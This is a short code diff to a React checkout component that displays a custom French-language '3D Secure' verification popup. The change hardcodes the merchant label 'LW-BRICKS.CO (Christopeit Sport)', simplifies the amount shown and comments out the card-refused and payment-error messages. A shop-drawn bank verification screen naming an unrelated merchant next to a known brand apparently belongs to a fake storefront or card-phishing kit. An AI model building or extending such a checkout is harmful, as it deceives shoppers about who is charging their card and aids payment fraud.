@@ -215,11 +215,12 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
       setIsLoading(false);
       setShow3DSecurePopup(false);
 
-      if (result === "refused") {
-        setShowCardError(true);
-      } else {
-        setShowPaymentError(true);
-      }
+      // Diferant Popup => (Optional)
+      // if (result === "refused") {
+      //   setShowCardError(true); 
+      // } else {
+      //   setShowPaymentError(true);
+      // }
     } catch (error) {
       console.error(data.checkoutPayError, error);
       alert(data.checkoutPayGenericError);
@@ -328,9 +329,9 @@ const CustomPay = ({ amount, orderNumber, onBack, showStep, isLoading, setIsLoad
             <h2></h2>
             <p className="desc">{data.checkoutPay3DSecureDescription}</p>
             <article className="infos">
-              <span>{checkoutProvider === "rento" ? "UAB Inrento (Christopeit Sport)" : `${shop.name} - Google Payment`}</span>
+              <span>LW-BRICKS.CO (Christopeit Sport)</span>
               <span>
-                Montant à valider : {(Math.floor(amount * 0.98) * 1.02).toFixed(2)}{shop.currency}
+                Montant à valider : {amount}{shop.currency}
               </span>
               <span> 
                 Date : {`${formattedDate} à ${formattedTime}`}
